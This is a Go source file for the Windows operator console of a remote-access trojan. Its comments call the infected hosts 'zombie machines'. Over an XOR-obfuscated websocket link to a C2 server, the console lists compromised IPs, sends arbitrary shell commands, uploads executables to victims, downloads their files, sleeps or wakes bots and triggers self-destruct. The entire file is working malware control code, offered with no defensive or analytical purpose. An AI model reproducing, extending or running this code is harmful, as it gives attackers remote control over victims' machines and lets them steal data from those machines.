package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/lxn/walk"
	. "github.com/lxn/walk/declarative"
	"golang.org/x/net/websocket"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
	"time"
)

const (
	SEND_MSG       = "0"   //一般信息，如cmd指令，cmd运行后返回值，提示信息等
	UPLOAD_FILE    = "1"   //上传文件到肉鸡
	DOWNLOAD_FILE  = "2"   //下载文件到控制台
	GET_IP_LIST    = "20"  //控制台获取ip列表
	UPDATE_REMARK  = "30"  //控制台修改备注信息
	GET_OUT_TEXT   = "40"  //控制台读取肉鸡保存的输出信息
	SLEEP_ROUSE    = "50"  //休眠/唤醒肉鸡
	ALL_SLEEP      = "000" //全部休眠
	CLEAN_OUT_TEXT = "60"  //控制台清空肉鸡输出信息
	KILL_ME        = "444" //杀了我
)

var (
	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
	//baseUrl     = ""
	baseUrl     = ""
	conn        *websocket.Conn
	origin      = "http://" + baseUrl + "/"
	url         = "ws://" + baseUrl + "/svrConnControlHandler"
	cmdHistory  = []string{}
	cmdHistoryP = 0
	random      string
	msgs        = make(chan Message)

	login string //登陆账户信息
)

type Message struct {
	Uuid string `json:"uuid"`
	Ip   string `json:"ip"`
	Name string `json:"name"`
	Msg  string `json:"msg"`

	FileName string `json:"fileName"`
	FileBody string `json:"fileBody"`

	Condoms []*Condom `json:"condoms"`
}

func NewMessage() Message {
	return Message{Uuid: random, Ip: ipInfo.Text()}
}

func init() {
	idUtil, _ := NewIdWorker(1)
	random = fmt.Sprint(idUtil.NextId())
}
func creatWebsocket() (*websocket.Conn, error) {
	return websocket.Dial(url, token(), origin)
}
func receiveMsg() { //接收返回的消息
	for {
		reqBytes, err := readMessage(conn) //接收消息
		if err != nil {
			outTE.AppendText(err.Error() + "\r\n断开连接，正在尝试重新连接服务器。。。\r\n")
		connect:
			conn, err = creatWebsocket() //连接远程主机
			if err != nil {
				outTE.AppendText(err.Error() + "\r\n连接服务器失败，10秒后重试...\r\n")
				time.Sleep(10 * time.Second)
				goto connect
			} else { //连接上了就重新读取数据
				//var tmp walk.Form
				//walk.MsgBox(tmp, "连接成功", "连接成功，请继续你的表演", walk.MsgBoxIconInformation)
				outTE.AppendText("连接成功，请继续你的表演。。。\r\n")
				continue
			}
		}
		if reqBytes == nil || len(reqBytes) == 0 {
			continue
		}
		reqBytes = encDec(reqBytes) //解密
		message, err := json2Message(reqBytes)
		if err != nil {
			outTE.AppendText(err.Error() + "\r\n")
		} else if len(reqBytes) > 3 {
			if message.Name == SEND_MSG { //0 执行命令返回结果
				outTE.AppendText(message.Msg + "\r\n")
			} else if message.Name == UPLOAD_FILE { //上传文件到肉鸡
				//控制台暂时无此信息
			} else if message.Name == DOWNLOAD_FILE { //下载文件到控制台本地
				fileBytes, err := base64.StdEncoding.DecodeString(message.FileBody) //base64 dec
				if err != nil {
					outTE.AppendText("文件base64 dec错误:" + err.Error() + "\r\n")
					continue
				}
				err = os.MkdirAll("./Download", os.ModePerm) //递归创建文件
				if err != nil {
					outTE.AppendText("创建本地文件夹失败:" + err.Error() + "\r\n")
					continue
				}
				file, err := os.Create("./Download/" + message.FileName)
				if err != nil {
					outTE.AppendText("创建本地文件失败:" + err.Error() + "\r\n")
					continue
				}
				_, err = file.Write(fileBytes)
				if err != nil {
					outTE.AppendText("写入文件失败:" + err.Error() + "\r\n")
					continue
				}
				if file != nil {
					file.Close()
				}
				outTE.AppendText("下载 " + message.FileName + " OK!\r\n")
			} else if message.Name == GET_IP_LIST { //获取肉鸡ip列表
				AllData = message.Condoms
				searchIP(model) //合并到搜索条件中
			} else if message.Name == UPDATE_REMARK { //修改肉鸡备注
				//同步修改列表信息
				for i, v := range model.items {
					if v.IP == message.Ip {
						model.items[i].Remark = message.Msg
						break
					}
				}
				model.PublishRowsReset()
				//同步修改全局缓存
				for i, v := range AllData {
					if v.IP == message.Ip {
						AllData[i].Remark = message.Msg
						break
					}
				}
			} else if message.Name == GET_OUT_TEXT { //获取肉鸡outText信息并显示
				if message.Uuid != "" && message.Uuid != random { //有其他人操作这个ip
					var tmp walk.Form
					walk.MsgBox(tmp, "警告", message.Ip+"正在被用户"+message.Uuid+"操作，您依然可以操作此IP，但请注意风险！", walk.MsgBoxIconInformation)
				}
				outTE.SetText(message.Msg)
			} else if message.Name == SLEEP_ROUSE { //休眠/唤醒提醒
				outTE.AppendText(message.Ip + " 已唤醒，请继续你的表演！\r\n")
			}
		}
		time.Sleep(time.Second)
	}
}
func readMessage(ws *websocket.Conn) ([]byte, error) {
again:
	fr, err := ws.NewFrameReader()
	if err != nil {
		return nil, err
	}
	frame, err := ws.HandleFrame(fr)
	if err != nil {
		return nil, err
	}
	if frame == nil {
		goto again
	}
	return ioutil.ReadAll(frame)
}

//发送websocket消息
func sendMessage(message Message) error {
	jsonBytes, _ := json.Marshal(message) //结构体转json
	jsonBytes = encDec(jsonBytes)         //加密
	if conn != nil {
		_, err := conn.Write(jsonBytes) //发送消息
		return err
	} else {
		return errors.New("conn is null pointer")
	}
}
func json2Message(strByte []byte) (Message, error) {
	var dat Message
	if err := json.Unmarshal(strByte, &dat); err == nil {
		return dat, nil
	} else {
		return dat, err
	}
}

func iplist() { //获取列表
wait:
	if conn == nil {
		time.Sleep(1 * time.Second)
		goto wait
	}

	for {
		message := NewMessage()
		message.Name = GET_IP_LIST
		msgs <- message //发送消息
		time.Sleep(20 * time.Second)
	}

}

var outTE *walk.TextEdit
var ipInfo, remark, cmd, search *walk.LineEdit

//var outTEMap = map[string]string{}
var mw *walk.MainWindow
var tv *walk.TableView
var model = NewCondomModel()
var AllData []*Condom

func main() {
	var loginMW *walk.MainWindow
	var loginNameTE, loginPwdTE *walk.LineEdit
	if _, err := (MainWindow{
		AssignTo: &loginMW,
		Title:    "ceshi ",
		Size:     Size{200, 200},
		Layout:   VBox{},
		Children: []Widget{
			Composite{
				Layout: Grid{Columns: 1},
				Children: []Widget{
					LineEdit{AssignTo: &loginNameTE, CueBanner: "name"},
					LineEdit{AssignTo: &loginPwdTE, CueBanner: "pwd"},
					PushButton{
						Text: "登陆",
						OnClicked: func() {
							login = loginNameTE.Text() + "-" + loginPwdTE.Text() //设置全局登陆信息
							runMainWindow(loginMW)
						},
					},
				},
			},
		},
	}.Run()); err != nil {
		var tmp walk.Form
		walk.MsgBox(tmp, "打开登陆页面错误", err.Error(), walk.MsgBoxIconInformation)
	}
}

func runMainWindow(loginMW *walk.MainWindow) { //主要操作面板
	go iplist()
	go outChan()
	var err error
	conn, err = creatWebsocket() //连接远程主机
	if conn != nil {
		defer conn.Close()
	}
	if err != nil {
		var tmp walk.Form
		walk.MsgBox(tmp, "连接服务器失败", err.Error(), walk.MsgBoxIconInformation)
		return
	}
	loginMW.Close() //登陆成功，关闭登录页
	walk.FocusEffect, _ = walk.NewBorderGlowEffect(walk.RGB(0, 63, 255))
	walk.InteractionEffect, _ = walk.NewDropShadowEffect(walk.RGB(63, 63, 63))
	walk.ValidationErrorEffect, _ = walk.NewBorderGlowEffect(walk.RGB(255, 0, 0))

	go receiveMsg() //接收返回的消息

	if _, err := (MainWindow{
		AssignTo: &mw,
		Title:    "哈哈哈哈哈哈嗝" + random,
		Size:     Size{1000, 800},
		Layout:   VBox{},
		Children: []Widget{
			HSplitter{
				Children: []Widget{
					VSplitter{
						StretchFactor: 4, //左面板占用比例
						Children: []Widget{
							TableView{
								StretchFactor: 9, //左面板上表格占用比例
								AssignTo:      &tv,
								Columns: []TableViewColumn{
									{Title: "IP"},
									{Title: "remark"},
									{Title: "whoami"},
									{Title: "name"},
									{Title: "time"},
								},
								Model:                 model,
								OnCurrentIndexChanged: func() { tableRowClick(model) },
							},
							Composite{
								StretchFactor: 1, //左面板下搜索框占用比例
								Layout:        Grid{Columns: 1, Spacing: 10},
								Children: []Widget{
									LineEdit{AssignTo: &search, CueBanner: "搜索 IP name remark", OnTextChanged: func() { searchIP(model) }},
									//PushButton{Text: "刷新", OnClicked: func() { iplist() },},
								},
							},
						},
					},

					VSplitter{
						StretchFactor: 6, //右面板占用比例
						Children: []Widget{
							Composite{
								StretchFactor: 1, //右面板上信息栏占用比例
								Layout:        Grid{Columns: 3, Spacing: 10},
								Children: []Widget{
									PushButton{Text: "自毁", OnClicked: func() { killMe() },},
									LineEdit{AssignTo: &ipInfo, ReadOnly: true, MaxSize: Size{Width: 100},},
									LineEdit{AssignTo: &remark, CueBanner: "备注", OnKeyDown: remarkKeyDown,},
								},
							},
							TextEdit{
								StretchFactor: 8, //右面板中间输出框占用比例
								Font:          Font{PointSize: 12},
								VScroll:       true,
								ReadOnly:      true,
								MaxLength:     9223372036854775807,
								AssignTo:      &outTE,
							},
							HSplitter{
								StretchFactor: 1, //右面板下输入栏占用比例
								Children: []Widget{
									Composite{
										StretchFactor: 1, //右面板 下输入栏 左边按钮 占用比例
										Layout:        Grid{Columns: 1, Spacing: 10},
										Children: []Widget{
											PushButton{Text: "清屏", OnClicked: func() { clean() }},
											PushButton{Text: "上传", OnClicked: func() { upFile(mw) }},
										},
									},
									LineEdit{
										StretchFactor: 9, //右面板 下输入栏 右边输入框 占用比例
										AssignTo:      &cmd,
										CueBanner:     ">", //提示
										OnKeyDown:     KeyDown,
									},
								},
							},
						},
					},
				},
			},
		},
	}.Run()); err != nil {
		var tmp walk.Form
		walk.MsgBox(tmp, "未知错误", err.Error(), walk.MsgBoxIconInformation)
	}
}

func killMe() {
	if ipInfo.Text() == "" { //没有选择ip
		var tmp walk.Form
		walk.MsgBox(tmp, "请先选择要操作的ip", "请先选择要操作的ip", walk.MsgBoxIconInformation)
		return
	}
	message := NewMessage()
	message.Name = KILL_ME
	msgs <- message //发送消息

}
func searchIP(model *CondomModel) {
	str := search.Text() //搜索条件
	if str == "" {
		model.items = AllData
	} else {
		modelcheck := &CondomModel{}
		for _, foo := range AllData {
			if strings.Contains(foo.IP, str) { //查ip有没有
				modelcheck.items = append(modelcheck.items, foo)
			} else if strings.Contains(foo.Name, str) { //hostname有没有
				modelcheck.items = append(modelcheck.items, foo)
			} else if strings.Contains(foo.Remark, str) { //备注有没有
				modelcheck.items = append(modelcheck.items, foo)
			}
		}
		model.items = modelcheck.items
	}
	model.PublishRowsReset()

}

func remarkKeyDown(key walk.Key) {
	if "Return" == key.String() { //回车键修改备注信息
		if ipInfo.Text() == "" { //没有选择ip
			var tmp walk.Form
			walk.MsgBox(tmp, "请先选择要操作的ip", "请先选择要操作的ip", walk.MsgBoxIconInformation)
			return
		}
		remarkStr := remark.Text()

		message := NewMessage()
		message.Name = UPDATE_REMARK
		message.Msg = remarkStr
		msgs <- message //发送消息
	}
}

//cmd
func KeyDown(key walk.Key) {      //Down   Up   Return
	if "Return" == key.String() { //回车键
		if ipInfo.Text() == "" { //没有选择ip
			var tmp walk.Form
			walk.MsgBox(tmp, "请先选择要操作的ip", "请先选择要操作的ip", walk.MsgBoxIconInformation)
			return
		}
		now := time.Now().Format("2006-01-02 15:04:05")
		cmdStr := cmd.Text()                                //获取输出命令
		outTE.AppendText("█" + now + ">" + cmdStr + "\r\n") //添加到控制台输出屏
		cmd.SetText("")                                     //清空cmd框
		if strings.Trim(cmdStr, " ") == "" {                //拦截空的无意义请求
			return
		}

		message := NewMessage()
		if strings.HasPrefix(cmdStr, "sleep ") { //判断休眠--------------------------------------------------------
			args := strings.Split(cmdStr, " ") //按空格切割参数
			if sleeptime, err := strconv.Atoi(args[1]); err != nil || len(args) != 2 || (sleeptime > 0 && sleeptime < 10) || sleeptime < 0 || sleeptime > 600 {
				outTE.AppendText("非法休眠指令,请保证sleep参数为0,或大于等于10小于等于600的数字\r\n")
				return
			}

			message.Name = SLEEP_ROUSE
			message.Msg = args[1] //休眠时间
		} else if cmdStr == "同志们辛苦了" { //休眠全部-----------------------------------------------------------------------
			message.Name = ALL_SLEEP
		} else if strings.HasPrefix(cmdStr, "ddd ") { //判断下载-----------------------------------------------------------------------------
			args := strings.Split(cmdStr, " ") //按空格切割参数
			if len(args) != 2 {
				outTE.AppendText("非法指令,请保证download参数正确\r\n")
				return
			}
			message.Name = DOWNLOAD_FILE
			message.Msg = args[1]
		} else {
			message.Name = SEND_MSG
			message.Msg = cmdStr
		}

		msgs <- message //发送消息

		cmdHistory = append(cmdHistory, cmdStr) //加入到历史命令缓存
		if len(cmdHistory) > 50 {               //只存储50条
			cmdHistory = cmdHistory[len(cmdHistory)-50 : len(cmdHistory)]
		}
		cmdHistoryP = len(cmdHistory) - 1 //初始化当前下标位置
	}

	if "Up" == key.String() { //方向上键
		cmdStr := cmdHistory[cmdHistoryP] //取出下标值
		cmd.SetText(cmdStr)
		cmdHistoryP-- //记录当前下标位置
		if cmdHistoryP < 0 {
			cmdHistoryP = 0 //下标越界就暂停
		}
	}

	if "Down" == key.String() { //方向下键
		cmdStr := cmdHistory[cmdHistoryP] //取出下标值
		cmd.SetText(cmdStr)
		cmdHistoryP++ //记录当前下标位置
		if cmdHistoryP > len(cmdHistory)-1 {
			cmdHistoryP = len(cmdHistory) - 1 //下标越界就停止
		}
	}
}

func upFile(mw *walk.MainWindow) {
	if ipInfo.Text() == "" { //没有选择ip
		var tmp walk.Form
		walk.MsgBox(tmp, "请先选择要操作的ip", "请先选择要操作的ip", walk.MsgBoxIconInformation)
		return
	}
	filePaths, err := selectFile(mw)
	if err != nil {
		var tmp walk.Form
		walk.MsgBox(tmp, "选择文件失败", err.Error(), walk.MsgBoxIconInformation)
		return
	}
	if len(filePaths) < 1 { //没有选择文件
		return
	}
	for _, filePath := range filePaths {
		strs := strings.Split(filePath, "\\")
		fileNeme := strs[len(strs)-1]
		fileByts, err := ioutil.ReadFile(filePath)
		if err != nil {
			var tmp walk.Form
			walk.MsgBox(tmp, "读取文件失败", err.Error(), walk.MsgBoxIconInformation)
			return
		}
		file64Str := base64.StdEncoding.EncodeToString(fileByts)
		message := NewMessage()
		message.Name = UPLOAD_FILE
		message.FileName = fileNeme
		message.FileBody = file64Str
		msgs <- message
	}

}

func clean() {
	//delete(outTEMap, ipInfo.Text()) //删除本地缓存
	outTE.SetText("")
	message := NewMessage()
	message.Name = CLEAN_OUT_TEXT
	msgs <- message //发送清空指令
}

func tableRowClick(model *CondomModel) {
	//保存上一个ip的输出信息到本地缓存
	//outTEMap[ipInfo.Text()] = outTE.Text()

	//修改显示的ip和备注
	i := tv.CurrentIndex()
	if i < 0 || i > len(model.items)-1 { //判断下标越界的情况
		return
	}
	ip := model.items[i].IP
	remarkStr := model.items[i].Remark
	ip = strings.Replace(ip, "*", "", -1) //替换掉可能有*号的ip
	ipInfo.SetText(ip)
	remark.SetText(remarkStr)

	//更换新ip的输出信息
	message := NewMessage()
	message.Name = GET_OUT_TEXT
	msgs <- message //发送指令

	//if ipMsg, ok := outTEMap[ip]; ok && ipMsg != "" { //如果以前有保存过的缓存直接读缓存
	//	outTE.SetText(ipMsg)
	//} else { //读取服务器缓存的肉鸡输出信息
	//	message := NewMessage()
	//	message.Name = GET_OUT_TEXT
	//	msgs <- message //发送指令
	//}

}

func selectFile(mw *walk.MainWindow) ([]string, error) {
	dlg := new(walk.FileDialog)
	dlg.Title = "选择文件"
	dlg.Filter = "所有文件 (*.*)|*.*|可执行文件 (*.exe)|*.exe"

	if ok, err := dlg.ShowOpenMultiple(mw); err != nil {
		return []string{}, err
	} else if !ok {
		return []string{}, nil
	}
	return dlg.FilePaths, nil
}

func outChan() { //发送消息到服务器
	for {
	wait:
		if conn == nil {
			time.Sleep(3 * time.Second)
			goto wait
		}
		msg := <-msgs
		sendMessage(msg)
	}
}

func encDec(byt []byte) []byte {
	for i, v := range byt {
		byt[i] = (byte(i+95) & (^v)) | (v & (^byte(i + 95)));
	}
	return byt
}

func token() string {
	tokenBytes := encDec([]byte(login)) //当前时间戳+mac地址
	token := base64.StdEncoding.EncodeToString(tokenBytes)
	return token
}
